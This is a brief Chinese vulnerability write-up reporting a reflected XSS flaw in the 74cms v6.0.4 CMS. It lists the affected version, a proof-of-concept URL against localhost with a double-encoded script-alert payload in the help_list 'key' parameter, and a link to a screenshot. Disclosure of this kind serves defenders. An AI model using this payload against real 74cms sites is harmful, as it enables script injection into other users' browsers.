# 74cms v6.0.4 反射型xss

## 影响范围

74cms v6.0.4

## 复现poc

`127.0.0.1/index.php?m=&c=help&a=help_list&key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88`

## 利用成功截图:

![](./1.png)